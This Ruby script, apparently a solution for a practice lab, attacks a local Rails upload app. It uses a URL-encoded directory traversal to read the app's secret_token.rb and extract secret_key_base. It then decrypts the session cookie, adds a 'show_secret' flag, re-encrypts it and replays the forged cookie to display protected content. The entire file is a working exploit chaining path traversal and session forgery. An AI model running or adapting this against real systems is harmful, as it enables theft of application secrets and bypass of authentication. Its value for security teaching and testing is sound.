require '../helpers/encryption_helper'
require 'mechanize'

include Helpers::Encryption

TARGET_HASH = { show_secret: true }

Mechanize.new.instance_eval do
  # Retrieve the secret key base through directory traversal
  puts '[+] Retrieving secret key base'
  get 'http://localhost:3000/uploads/%2E%2E%2Fconfig%2Finitializers%2Fsecret_token.rb'

  secret_key_base = page.body.match(/secret_key_base = '(.*)'/)
                      .captures
                      .first

  # Retrieve the session hash  
  puts '[+] Retrieving session hash'                    
  get '/'
  session_h = cookie_jar.cookies.first.value

  # Decrypt the session hash
  puts '[+] Decrypting session hash'
  cleartext_h = decrypt_session_cookie(session_h, secret_key_base)
  
  # Add a new key to the session hash
  puts '[+] Adding new key to session hash'
  cleartext_h.merge!(TARGET_HASH)

  # Encrypt the updated session hash
  puts '[+] Encrypting updated hash'
  new_h = encrypt_session_cookie(cleartext_h, secret_key_base)

  # Clear cookie jar and add our updated cookie
  puts '[+] Updating the cookie jar'
  cookie_jar.clear!

  new_cookie = Mechanize::Cookie.new('_ultimate-uploader_session', new_h).tap do |c|
    c.domain = 'localhost:3000'
    c.path = '/'
  end
  cookie_jar.add(history.last.uri, new_cookie)

  # Display secret
  get '/'
  puts '[+] Success'
  puts page.search('.secret').text.strip
end
